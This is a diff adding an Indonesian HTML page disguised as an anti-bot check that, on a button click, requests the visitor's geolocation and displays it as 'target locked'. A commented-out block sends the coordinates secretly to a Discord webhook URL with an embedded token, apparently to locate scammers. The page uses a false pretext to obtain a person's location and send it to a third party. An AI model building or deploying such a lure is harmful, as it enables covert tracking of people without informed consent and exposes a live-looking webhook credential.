@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Konfirmasi Keamanan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            max-width: 400px;
+            width: 100%;
+        }
+        h2 { margin-top: 0; color: #333; }
+        button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        button:hover { background-color: #166fe5; }
+        #result {
+            margin-top: 25px;
+            font-size: 14px;
+            font-family: monospace;
+            color: #d9534f;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Verifikasi Anti-Bot</h2>
+        <p>Sistem kami mendeteksi aktivitas yang tidak wajar. Silakan klik tombol di bawah untuk melanjutkan ke halaman tujuan.</p>
+        <button onclick="getLocation()">Lanjutkan</button>
+        <p id="result"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                // Minta izin lokasi ke browser target
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById("result").innerHTML = "Geolocation tidak didukung oleh browser target.";
+            }
+        }
+
+        function showPosition(position) {
+            let lat = position.coords.latitude;
+            let lon = position.coords.longitude;
+
+            // Menampilkan koordinat di layar target
+            document.getElementById("result").innerHTML = 
+                `<strong>TARGET TERKUNCI</strong><br><br>` +
+                `Latitude: ${lat}<br>` +
+                `Longitude: ${lon}<br><br>` +
+                `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>`;
+
+            // OPSIONAL: Mengirim data koordinat ke server Anda secara diam-diam
+            // Anda dapat menggunakan Discord Webhook atau layanan logger (seperti webhook.site)
+            /*
+            const webhookUrl = 'MASUKKAN_URL_WEBHOOK_ANDA_DISINI';
+            fetch(https://discord.com/api/webhooks/1566844180997869678/rEzd2UAvY6ZnQx8bJsT2UUc0eYyj0SD4Y9PetmKrVPsClW3v7gAhZEGATpFCBbDzhFCt, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **LOKASI PENIPU DIDAPATKAN** 🚨\n**Latitude:** ${lat}\n**Longitude:** ${lon}\n**Maps:** https://www.google.com/maps?q=${lat},${lon}`
+                })
+            });
+            */
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("result").innerHTML = "Gagal: Target menolak memberikan izin akses lokasi.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("result").innerHTML = "Gagal: Informasi lokasi perangkat tidak tersedia.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("result").innerHTML = "Gagal: Waktu permintaan lokasi habis.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById("result").innerHTML = "Gagal: Terjadi kesalahan yang tidak diketahui.";
+                    break;
+            }
+        }
+    </script>
+</body>
+</html>
